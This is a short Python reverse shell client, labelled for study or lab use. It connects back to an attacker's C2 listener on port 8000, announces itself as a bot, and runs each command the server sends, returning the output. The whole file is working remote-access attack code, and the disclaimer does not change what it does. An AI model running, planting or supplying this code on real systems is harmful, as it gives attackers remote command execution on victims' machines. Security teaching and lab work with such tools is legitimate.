#!/usr/bin/env python3
"""
Reverse shell client (study/lab use only).
Connects back to an attacker's C2 listener and executes received commands.

Usage:
    python3 reverse_shell_client.py <c2_ip>
Pairs with c2_shell_server.py listening on port 8000.
"""
import sys
from subprocess import Popen, PIPE
from socket import socket, AF_INET, SOCK_STREAM

server_ip = sys.argv[1]
server_port = 8000

s = socket(AF_INET, SOCK_STREAM)   # AF_INET6 / SOCK_DGRAM for IPv6 / UDP
s.connect((server_ip, server_port))
s.send(b"Bot reporting for duty")

command = s.recv(4064).decode()
while command != "exit":
    proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
    result, err = proc.communicate()
    s.send(result + err)
    command = s.recv(4064).decode()
s.close()
